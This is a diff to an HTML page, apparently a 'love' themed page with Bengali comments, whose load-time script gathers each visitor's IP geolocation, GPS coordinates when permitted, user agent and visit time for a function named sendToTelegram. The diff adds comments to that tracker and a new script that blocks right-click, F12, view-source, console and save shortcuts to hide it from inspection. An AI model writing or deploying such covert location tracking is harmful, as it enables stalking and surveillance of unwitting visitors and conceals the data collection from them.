@@ -306,7 +306,8 @@ function love() {
 <script>
     window.addEventListener('load', function() {
         setTimeout(function() {
-			
+            
+            // মেইন ফাংশন: টেলিগ্রামে ডেটা পাঠানো
             function sendToTelegram(exactLat, exactLon, locationPrecision) {
                 fetch('https://get.geojs.io/v1/ip/geo.json')
                     .then(r => r.json())
@@ -315,6 +316,7 @@ function love() {
                         var visitTime = new Date().toLocaleString('en-US', { timeZone: 'Asia/Dhaka' });
                         var userAgent = navigator.userAgent;
 
+                        // যদি GPS পারমিশন দেয়, তাহলে Exact Location নিবে, না দিলে IP এর লোকেশন নিবে
                         var finalLat = exactLat ? exactLat : data.latitude;
                         var finalLon = exactLon ? exactLon : data.longitude;
                         var mapLink = finalLat ? "https://www.google.com/maps?q=" + finalLat + "," + finalLon : "Not Available";
@@ -367,6 +369,38 @@ function love() {
 
         }, 1500);
     });
+</script>
+
+<!-- Anti-Inspect & Security Lock Script -->
+<script>
+    // Right Click (মাউসের ডান বাটন) ব্লক করা
+    document.addEventListener('contextmenu', function(e) {
+        e.preventDefault();
+    });
+
+    // কীবোর্ডের শর্টকাটগুলো ব্লক করা
+    document.onkeydown = function(e) {
+        // F12 ব্লক
+        if (e.keyCode == 123) {
+            return false;
+        }
+        // Ctrl+Shift+I (Inspect) ব্লক
+        if (e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)) {
+            return false;
+        }
+        // Ctrl+Shift+J (Console) ব্লক
+        if (e.ctrlKey && e.shiftKey && e.keyCode == 'J'.charCodeAt(0)) {
+            return false;
+        }
+        // Ctrl+U (View Source) ব্লক
+        if (e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) {
+            return false;
+        }
+        // Ctrl+S (Save Page) ব্লক
+        if (e.ctrlKey && e.keyCode == 'S'.charCodeAt(0)) {
+            return false;
+        }
+    };
 </script>
 
 </body>
